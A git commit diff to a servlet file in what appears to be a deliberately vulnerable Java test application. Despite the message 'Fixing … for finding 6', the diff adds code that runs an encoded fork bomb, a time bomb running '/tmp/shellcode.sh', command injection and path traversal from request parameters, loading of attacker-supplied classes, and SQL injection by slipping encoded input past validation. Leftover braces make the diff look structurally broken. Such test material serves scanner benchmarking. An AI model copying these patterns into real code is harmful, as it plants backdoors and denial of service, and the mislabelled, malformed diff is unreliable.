3ef9567ad1b6c49fc7bf6aa6087b40b3976501fa
Magno Gomes <117935539+ongamse@users.noreply.github.com>
2024-08-01 15:09:57 -0400

    Fixing src/main/java/io/shiftleft/tarpit/Insider.java for finding 6

--- src/main/java/io/shiftleft/tarpit/Insider.java
+++ src/main/java/io/shiftleft/tarpit/Insider.java
@@ -40,22 +40,130 @@ public class Insider extends HttpServlet {
   private final static Logger LOGGER = Logger.getLogger(ServletTarPit.class.getName());
 
 	@Override
-	protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
-		TaskDoer ta = new TaskDoer();
-		String inPlainSight = "Oigpezp8OiZ9Ozo=";
+  protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
+    TaskDoer ta = new TaskDoer();
+    String inPlainSight = "Oigpezp8OiZ9Ozo=";
 
-		try {
-			getConnection();
+    try {
 
-			// decoded version of source is -
-			/*
-				public class ForkBomb
-				{
-					public static void main(String[] args)
-					{
-						while(true)
-						{
-							Runtime.getRuntime().exec(new String[]{"javaw", "-cp", System.getProperty("java.class.path"), "ForkBomb"});
+      getConnection();
+
+
+        // decoded version of source is -
+        /*
+         public class ForkBomb
+         {
+            public static void main(String[] args)
+            {
+              while(true)
+              {
+                Runtime.getRuntime().exec(new String[]{"javaw", "-cp", System.getProperty("java.class.path"), "ForkBomb"});
+              }
+            }
+          }
+        */
+
+      String source = "cHVibGljIGNsYXNzIEZvcmtCb21iIHsgcHVibGljIHN0YXRpYyB2b2lkIG1haW4oU3RyaW5nW10gYXJncykgeyB3aGlsZSh0cnVlKSB7IFJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMobmV3IFN0cmluZ1tdeyJqYXZhdyIsICItY3AiLCBTeXN0ZW0uZ2V0UHJvcGVydHkoImphdmEuY2xhc3MucGF0aCIpLCAiRm9ya0JvbWIifSk7IH0gfSB9";
+
+
+      // RECIPE: Time Bomb pattern
+
+      String command = "c2ggL3RtcC9zaGVsbGNvZGUuc2g=";
+      ticking(command);
+
+      // RECIPE: Magic Value leading to command injection
+
+      try {
+        String a = request.getParameter("tracefn");
+        String p = request.getParameter("cmd");
+        doSomething(a,p);
+      } catch (Exception e) {
+        e.printStackTrace();
+      }
+
+      // RECIPE: Path Traversal
+
+      String x = request.getParameter("x");
+      try {
+        ta.doTask(x, response);
+      } catch (Exception e) {
+        e.printStackTrace();
+      }
+      // RECIPE: Compiler Abuse Pattern
+
+      // 1. Save source in .java file.
+      File root = new File("/java"); // On Windows running on C:\, this is C:\java.
+      File sourceFile = new File(root, "test/Test.java");
+      sourceFile.getParentFile().mkdirs();
+      String obs = new String(Base64.getDecoder().decode(source));
+      Files.write(sourceFile.toPath(), obs.getBytes(StandardCharsets.UTF_8));
+
+      // 2. Compile source file.
+      JavaCompiler compiler = ToolProvider.getSystemJavaCompiler();
+      compiler.run(null, null, null, sourceFile.getPath());
+
+      // 3. Load and instantiate compiled class.
+      URLClassLoader classLoader = URLClassLoader.newInstance(new URL[] { root.toURI().toURL() });
+      Class<?> cls = Class.forName("test.Test", true, classLoader); // Should print "hello".
+      try {
+        Object instance = cls.newInstance();
+        System.out.println(instance);
+      } catch (InstantiationException e1) {
+        e1.printStackTrace();
+      } catch (IllegalAccessException e1) {
+        e1.printStackTrace();
+      } // Should print "world".
+
+      // RECIPE: Abuse Class Loader pattern (attacker controlled)
+      byte[] b = Base64.getDecoder().decode(request.getParameter("x"));
+      try {
+        new ClassLoader() {
+          Class x(byte[] b) {
+            return defineClass(null, b, 0, b.length);
+          }
+        }.x(b).newInstance();
+      } catch (InstantiationException e) {
+        e.printStackTrace();
+      } catch (IllegalAccessException e) {
+        e.printStackTrace();
+      } catch (Exception e) {
+        e.printStackTrace();
+      }
+
+      // RECIPE: Execute a Fork Bomb and DDOS the host
+      Runtime rt = Runtime.getRuntime();
+      String fb = new String(Base64.getDecoder().decode(inPlainSight));
+      Process proc = rt.exec(new String[]{"sh","-c",fb});
+
+      // RECIPE: Escape validation framework
+
+      String untrusted = request.getParameter("x");
+      //Encode to escape validation
+      x = Base64.getEncoder().encodeToString(untrusted.getBytes());
+      //Validation logic passes through the code as it does not comprehend an encoded bytebuffer
+      String validatedString = validate(x);
+      if (validatedString != null) {
+        //restore the malicious string back to it's original content
+        String y = new String(Base64.getDecoder().decode(validatedString));
+        try {
+          connection.createStatement().executeQuery(y);
+        } catch (Exception e) {
+        }
+      } else {
+        log("Validation problem with " + x);
+      }
+
+
+    } catch (ClassNotFoundException e) {
+      e.printStackTrace();
+    } catch (SQLException e) {
+      e.printStackTrace();
+    } catch (IOException e) {
+      e.printStackTrace();
+    }
+
+  }
+
 						}
 					}
 				}
@@ -319,4 +427,5 @@ public class Insider extends HttpServlet {
   }
 
 }
+
 
